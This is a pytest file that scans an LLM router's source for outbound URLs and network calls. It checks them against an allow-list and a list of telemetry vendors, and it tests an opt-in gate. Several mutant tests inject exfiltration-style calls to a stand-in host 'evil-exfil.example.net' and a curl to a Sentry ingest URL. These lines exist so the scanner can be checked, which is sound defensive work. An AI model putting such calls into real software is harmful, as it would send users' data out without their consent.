"""PLAN v16 MUST P1.6-k: every network call site resolves to a provider API
the user chose, or the catalog URL pinned by sha256; 0 telemetry endpoints;
Frontier shadow and judge calls only behind OD-4 consent.

Check URL-bearing literals and assets across src/ and hooks/, resolve Python
network call targets, and exercise the scanner with mutants and the OD-4 gate.
CATALOG_PINNED holds the D-22 sha256-pinned catalog host (D-89).
"""

from __future__ import annotations

import ast
import ipaddress
import re
import shutil
from itertools import islice, product
from pathlib import Path
from typing import NamedTuple

REPO = Path(__file__).resolve().parents[1]
SCAN_DIRS = ("src", "hooks")
URL_RE = re.compile(r"\b(?:https?|wss?)://(\[[0-9A-Fa-f:]+\]|[A-Za-z0-9][A-Za-z0-9.\-_]*)")
SUFFIXES = {".py", ".sh", ".mjs", ".js", ".ts", ".tsx", ".html", ".yaml", ".yml", ".json", ".toml"}

PROVIDER_API = {
    "api.anthropic.com": "Anthropic API (user's key / OAuth)",
    "api.openai.com": "OpenAI API (OPENAI_API_KEY)",
    "generativelanguage.googleapis.com": "Gemini API (GEMINI_API_KEY)",
    "api.mistral.ai": "Mistral /models in resolver/auth_ping.py, only with the provider's key",
    "api.deepseek.com": "DeepSeek /models in resolver/auth_ping.py, only with the provider's key",
    "api.groq.com": "Groq /models in resolver/auth_ping.py, only with the provider's key",
    "api.together.ai": "Together /models in resolver/auth_ping.py, only with the provider's key",
    "api.x.ai": "xAI /models in resolver/auth_ping.py, only with the provider's key",
    "api.cohere.com": "Cohere /models in resolver/auth_ping.py, only with the provider's key",
    "api.moonshot.ai": "Moonshot /models in resolver/auth_ping.py, only with the provider's key",
    "openrouter.ai": "OpenRouter key-info in resolver/auth_ping.py, only with the provider's key",
    "api.elevenlabs.io": "ElevenLabs media.py provider, only with its key",
    "api.stability.ai": "Stability media.py provider, only with its key",
    "queue.fal.run": "Fal media.py provider, only with its key",
    "api.dev.runwayml.com": "Runway media.py provider, only with its key",
    "api.helicone.ai": "Helicone spend pull, only with HELICONE_API_KEY and LLM_ROUTER_HELICONE_PULL (user opt-in)",
    "agoragentic.com": "Agoragentic tools, registered only with LLM_ROUTER_AGORAGENTIC=on (SEC-003, user opt-in)",
}
# D-22 / D-89: fetched only after opt-in (LLM_ROUTER_AUTO_BENCHMARK_FETCH, default off),
# and rejected unless the bytes match the sha256 in src/llm_router/data/catalog_pins.json.
CATALOG_PINNED: dict[str, str] = {
    "raw.githubusercontent.com": "benchmark catalog and default community profile, sha256-pinned in catalog_pins.json (benchmark_fetcher.py); the unpinned scraper moved to scripts/bench",
}
# D-89: called, but only when the user types the command.
USER_COMMAND = {
    "pypi.org": "only on the user's explicit update command",
    "pypistats.org": "only on the user's explicit stats command",
}
NON_NETWORK = {
    "cdn.jsdelivr.net": "display assets loaded by the user's browser from dashboard HTML, never fetched by the router",
    "cdn.tailwindcss.com": "display assets loaded by the user's browser from dashboard HTML, never fetched by the router",
    "fonts.googleapis.com": "display assets loaded by the user's browser from dashboard HTML, never fetched by the router",
    "ai.google.dev": "Gemini documentation resource in generated capability notes",
    "aistudio.google.com": "Gemini key signup link printed by setup",
    "api.telegram.org": "Telegram endpoint example shown in team setup hints",
    "api.together.xyz": "Together key signup link printed by setup",
    "claude.ai": "Browser navigation instructions shown for subscription setup",
    "claude.com": "Claude CLI install hint",
    "console.anthropic.com": "Anthropic key signup link printed by setup",
    "console.groq.com": "Groq key signup link printed by setup",
    "console.mistral.ai": "Mistral key signup link printed by setup",
    "console.x.ai": "xAI key signup link printed by setup",
    "dashboard.cohere.com": "Cohere key signup link printed by setup",
    "dev.runwayml.com": "Runway signup link printed by setup",
    "discord.com": "Discord webhook example or recognition of a user-configured webhook",
    "elevenlabs.io": "ElevenLabs key signup link printed by setup",
    "fal.ai": "Fal key signup link printed by setup",
    "github.com": "Project and benchmark links shown to the user",
    "github": "Escaped Markdown link fragment in team.py",
    "google.com": "Gemini CLI install hint",
    "hooks.slack.com": "Slack webhook example or recognition of a user-configured webhook",
    "llm_router.dev": "Pro upgrade link shown to the user",
    "nodejs.org": "Node.js install hint printed by the hook",
    "ollama.com": "Ollama install hint",
    "openai.com": "Codex CLI install hint",
    "platform.deepseek.com": "DeepSeek key signup link printed by setup",
    "platform.openai.com": "OpenAI signup and documentation links shown to the user",
    "platform.stability.ai": "Stability key signup link printed by setup",
    "replicate.com": "Replicate key signup link printed by setup",
    "twitter.com": "Tweet intent URL printed for the user to open",
    "www.apple.com": "plist DTD URI",
    "www.perplexity.ai": "Perplexity key signup link printed by setup",
    "www.w3.org": "SVG XML namespace",
    "your-server.com": "Placeholder server in team endpoint setup hints",
}
# code.claude.com occurs only in a skipped shell comment, not a swept literal.
TELEMETRY_MARKERS = (
    "sentry.io", "posthog", "segment.io", "segment.com", "mixpanel",
    "amplitude.com", "datadoghq", "honeycomb.io", "newrelic", "nr-data.net",
    "google-analytics", "googletagmanager", "plausible.io", "bugsnag", "rollbar",
    "statsig", "launchdarkly", "logrocket", "hotjar", "heap.io", "scarf.sh", "telemetry",
)


class Site(NamedTuple):
    where: str
    func: str
    hosts: frozenset[str]


def iter_files(root: Path):
    return iter(sorted(
        path for dirname in SCAN_DIRS for path in (root / dirname).rglob("*")
        if path.is_file() and path.suffix in SUFFIXES
        and not {"tests", "__pycache__"}.intersection(path.relative_to(root).parts)
    ))


def parse_file(path: Path, root: Path) -> ast.Module:
    try:
        return ast.parse(path.read_text(encoding="utf-8"), filename=path.relative_to(root).as_posix())
    except SyntaxError as exc:
        raise AssertionError(f"{path.relative_to(root).as_posix()}: {exc}") from exc


def hosts_of(text: str) -> set[str]:
    return {match.group(1).lower().strip("[]").rstrip(".") for match in URL_RE.finditer(text)}


def sweep_hosts(root: Path) -> dict[str, list[str]]:
    found: dict[str, list[str]] = {}
    for path in iter_files(root):
        rel = path.relative_to(root).as_posix()
        if path.suffix == ".py":
            tree = parse_file(path, root)
            excluded = {id(node.value) for node in ast.walk(tree) if isinstance(node, ast.Expr)}
            values = [(node.lineno, node.value) for node in ast.walk(tree)
                      if isinstance(node, ast.Constant) and isinstance(node.value, str)
                      and id(node) not in excluded]
        else:
            values = [(line, text) for line, text in enumerate(path.read_text(encoding="utf-8").splitlines(), 1)
                      if not text.lstrip().startswith(("#", "//"))]
        for line, text in values:
            for match in URL_RE.finditer(text):
                host = match.group(1).lower().strip("[]").rstrip(".")
                where = f"{rel}:{line + text[:match.start()].count(chr(10))}"
                found.setdefault(host, []).append(where)
    return {host: sorted(where) for host, where in sorted(found.items())}


def is_loopback(host: str) -> bool:
    if host in {"localhost", "::1", "0.0.0.0"} or host.endswith(".localhost"):
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


def dotted(node: ast.AST) -> str:
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        return f"{dotted(node.value)}.{node.attr}"
    return "?"


SCOPES = (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef, ast.Lambda)


def assignments(scope: ast.AST) -> dict[str, list[ast.AST]]:
    found: dict[str, list[ast.AST]] = {}

    def visit(node):
        if node is not scope and isinstance(node, SCOPES):
            return
        if isinstance(node, (ast.Assign, ast.AnnAssign)) and node.value is not None:
            targets = node.targets if isinstance(node, ast.Assign) else [node.target]
            for target in targets:
                # Ignore with-bindings; unpacked names conservatively see the whole RHS.
                for part in ast.walk(target):
                    if isinstance(part, ast.Name) and isinstance(part.ctx, ast.Store):
                        found.setdefault(part.id, []).append(node.value)
                    elif isinstance(part, ast.Attribute) and isinstance(part.ctx, ast.Store):
                        found.setdefault(part.attr, []).append(node.value)
        for child in ast.iter_child_nodes(node):
            visit(child)

    visit(scope)
    return found


class Context(NamedTuple):
    local: dict[str, list[ast.AST]]
    module: dict[str, list[ast.AST]]
    classes: dict[str, list[ast.AST]]


def assigned(node: ast.AST, ctx: Context) -> list[ast.AST]:
    if isinstance(node, ast.Name):
        for mapping in ctx:
            if node.id in mapping:
                return mapping[node.id]
    elif isinstance(node, ast.Attribute):
        return ctx.classes.get(node.attr, []) + ctx.module.get(node.attr, [])
    return []


def resolve(node: ast.AST | None, ctx: Context, depth: int = 0) -> set[str]:
    if node is None or depth > 6:
        return set()
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return {node.value}
    if isinstance(node, ast.JoinedStr):
        parts = [resolve(part.value if isinstance(part, ast.FormattedValue) else part, ctx, depth + 1)
                 or {"\x00"} for part in node.values]
        return {"".join(parts) for parts in islice(product(*(sorted(part) for part in parts)), 16)}
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        left, right = resolve(node.left, ctx, depth + 1), resolve(node.right, ctx, depth + 1)
        return {a + b for a, b in islice(product(sorted(left), sorted(right)), 16)}
    if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "format":
        return resolve(node.func.value, ctx, depth + 1)
    if isinstance(node, (ast.Name, ast.Attribute)):
        return {text for value in assigned(node, ctx) for text in resolve(value, ctx, depth + 1)}
    if isinstance(node, ast.Subscript) and isinstance(node.value, (ast.Name, ast.Attribute)):
        return {part.value for value in assigned(node.value, ctx) for part in ast.walk(value)
                if isinstance(part, ast.Constant) and isinstance(part.value, str) and URL_RE.search(part.value)}
    if isinstance(node, ast.Call) and dotted(node.func) in {"urllib.request.Request", "Request"}:
        return resolve(url_arg(node), ctx, depth + 1)
    return set()


def url_arg(node: ast.Call) -> ast.AST | None:
    for keyword in node.keywords:
        if keyword.arg == "url":
            return keyword.value
    index = 1 if dotted(node.func).split(".")[-1] in {"request", "stream"} else 0
    return node.args[index] if len(node.args) > index else None


def call_sites(root: Path) -> list[Site]:
    found = []
    methods = {"post", "put", "patch", "delete", "stream", "request", "send", "ws_connect", "get", "head", "options"}
    receivers = {"client", "_client", "http", "session", "_session", "sess", "c", "ac", "httpx", "requests"}
    for path in iter_files(root):
        if path.suffix != ".py":
            continue
        tree = parse_file(path, root)
        parents = {child: node for node in ast.walk(tree) for child in ast.iter_child_nodes(node)}
        module, classes = assignments(tree), {}
        locals_ = {node: assignments(node) for node in ast.walk(tree)
                   if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda))}
        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef):
                for name, values in assignments(node).items():
                    classes.setdefault(name, []).extend(values)
        imported = any(
            isinstance(node, ast.Import) and any(alias.name == "urllib.request" for alias in node.names)
            or isinstance(node, ast.ImportFrom) and (
                node.module == "urllib.request"
                or node.module == "urllib" and any(alias.name == "request" for alias in node.names))
            for node in ast.walk(tree)
        )
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            func = dotted(node.func)
            last = func.split(".")[-1]
            direct = last == "urlopen" or imported and func in {"urllib.request.Request", "Request"}
            method = isinstance(node.func, ast.Attribute) and last in methods
            if not (direct or method):
                continue
            scope = parents.get(node)
            while scope is not None and scope not in locals_:
                scope = parents.get(scope)
            ctx = Context(locals_.get(scope, {}), module, classes)
            candidates = resolve(url_arg(node), ctx)
            hosts = frozenset(host for text in candidates
                              for host in hosts_of(text.split("\x00", 1)[0]))
            receiver = dotted(node.func.value).split(".")[-1].lower() if method else ""
            # A method call whose argument resolves only to scheme-less text is a
            # mapping lookup (`row.get("id")`), not a request; a bare `get` needs
            # an HTTP-client receiver name, since `c`/`session` are often dicts.
            if method and candidates and not any("://" in text or text.startswith("\x00") for text in candidates):
                continue
            known = receivers - {"c", "sess", "session", "_session", "ac"} if last in {"get", "head", "options"} else receivers
            if direct or method and (receiver in known or hosts):
                found.append(Site(f"{path.relative_to(root).as_posix()}:{node.lineno}", func, hosts))
    return sorted(found)


def unclassified(root: Path) -> list[str]:
    allowed = PROVIDER_API.keys() | CATALOG_PINNED.keys() | USER_COMMAND.keys() | NON_NETWORK.keys()
    return [
        f"{host}: not on the P1.6-k allow-list (provider API the user chose / sha256-pinned catalog / display-only) at {', '.join(where[:5])}"
        for host, where in sweep_hosts(root).items() if not is_loopback(host) and host not in allowed
    ]


def unallowed_calls(root: Path) -> list[str]:
    found = []
    for site in call_sites(root):
        for host in sorted(site.hosts):
            if is_loopback(host) or host in PROVIDER_API or host in CATALOG_PINNED or host in USER_COMMAND:
                continue
            reason = "listed as display-only but called" if host in NON_NETWORK else "not a provider API the user chose or a sha256-pinned catalog"
            found.append(f"{site.where}: {site.func}() reaches {host}, which is {reason}")
    return found


def telemetry(root: Path) -> list[str]:
    found = [f"{host}: telemetry endpoint at {', '.join(where)}"
             for host, where in sweep_hosts(root).items()
             if any(marker in host for marker in TELEMETRY_MARKERS)]
    for mapping in (PROVIDER_API, CATALOG_PINNED, USER_COMMAND, NON_NETWORK):
        found.extend(f"{host}: telemetry endpoint in allow-list"
                     for host in mapping if any(marker in host for marker in TELEMETRY_MARKERS))
    return found


def test_scanner_sees_the_real_hosts_and_call_sites(capsys):
    found, sites = sweep_hosts(REPO), call_sites(REPO)
    resolved = sum(bool(site.hosts) for site in sites)
    with capsys.disabled():
        print(f"P1.6-k: {len(found)} hosts found: {', '.join(found)}")
        print(f"P1.6-k: {len(sites)} network call sites, {resolved} resolved to a host, {len(sites) - resolved} dynamic (config/user-supplied)")
    assert len(found) >= 30
    assert {"api.anthropic.com", "localhost"} <= found.keys()
    assert len(sites) >= 40
    assert resolved >= 15


def test_every_outbound_host_is_on_the_allow_list():
    violations = unclassified(REPO)
    assert not violations, "\n".join(violations)


def test_every_network_call_site_reaches_only_an_allowed_host():
    violations = unallowed_calls(REPO)
    assert not violations, "\n".join(violations)


def test_zero_telemetry_endpoints():
    violations = telemetry(REPO)
    assert not violations, "\n".join(violations)


def test_allow_list_has_no_stale_entries():
    found = sweep_hosts(REPO)
    assert not (PROVIDER_API.keys() | CATALOG_PINNED.keys() | USER_COMMAND.keys() | NON_NETWORK.keys()) - found.keys()
    assert not PROVIDER_API.keys() & NON_NETWORK.keys()
    assert not PROVIDER_API.keys() & CATALOG_PINNED.keys()
    assert not NON_NETWORK.keys() & CATALOG_PINNED.keys()
    assert not USER_COMMAND.keys() & (PROVIDER_API.keys() | CATALOG_PINNED.keys() | NON_NETWORK.keys())


def copy_auth_ping(root: Path) -> Path:
    path = root / "src/llm_router/resolver/auth_ping.py"
    path.parent.mkdir(parents=True)
    shutil.copyfile(REPO / "src/llm_router/resolver/auth_ping.py", path)
    return path


def test_clean_auth_ping_fixture(tmp_path):
    copy_auth_ping(tmp_path)
    assert len(sweep_hosts(tmp_path)) >= 5
    assert unclassified(tmp_path) == []
    assert unallowed_calls(tmp_path) == []
    assert telemetry(tmp_path) == []


def test_injected_outbound_host(tmp_path):
    path = copy_auth_ping(tmp_path)
    text = path.read_text(encoding="utf-8")
    text += '\nimport urllib.request\n'
    line = text.count("\n") + 1
    text += '_LEAK = urllib.request.urlopen("https://evil-exfil.example.net/collect")\n'
    path.write_text(text, encoding="utf-8")
    where = f"src/llm_router/resolver/auth_ping.py:{line}"
    for violations in (unclassified(tmp_path), unallowed_calls(tmp_path)):
        assert any("evil-exfil.example.net" in item and where in item for item in violations)


def test_shell_telemetry_and_comment_exclusion(tmp_path):
    path = tmp_path / "hooks/x.sh"
    path.parent.mkdir()
    path.write_text(
        "curl -s https://o42.ingest.sentry.io/api/1/store\n# https://evil-exfil.example.net\n",
        encoding="utf-8",
    )
    found = sweep_hosts(tmp_path)
    assert "evil-exfil.example.net" not in found
    assert any("o42.ingest.sentry.io" in item and "hooks/x.sh:1" in item for item in telemetry(tmp_path))


def test_display_only_host_is_forbidden_when_called(tmp_path):
    path = tmp_path / "src/pkg/display.py"
    path.parent.mkdir(parents=True)
    path.write_text('import httpx\nhttpx.get("https://github.com/x")\n', encoding="utf-8")
    assert any("github.com" in item and "display-only but called" in item for item in unallowed_calls(tmp_path))


def test_module_constant_in_dynamic_f_string(tmp_path):
    path = tmp_path / "src/pkg/dynamic.py"
    path.parent.mkdir(parents=True)
    path.write_text(
        'BASE = "https://evil-exfil.example.net"\ndef f(c):\n    return c.post(f"{BASE}/v1")\n',
        encoding="utf-8",
    )
    assert any("evil-exfil.example.net" in item and "src/pkg/dynamic.py:3" in item for item in unallowed_calls(tmp_path))


def test_frontier_shadow_and_judge_make_no_call_without_the_od4_switch(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("LLM_ROUTER_HOME", str(tmp_path))
    monkeypatch.delenv("LLM_ROUTER_SHADOW_FRONTIER", raising=False)
    from llm_router import shadow_frontier as sf

    calls = []

    def replay(body):
        calls.append(body)

    assert sf.FrontierShadow().maybe_sample(
        b"{}", "claude-haiku-4-5", "claude-opus-4-1", sf.DOOR_PROXY, "t1", replay=replay
    ) is None
    assert calls == []
    assert sf.judge_pending(run=lambda b, i: calls.append(i) or {})["status"] == "off"
    assert calls == []
    monkeypatch.setenv(sf.ENV_FLAG, "on")
    assert sf.enabled() is True
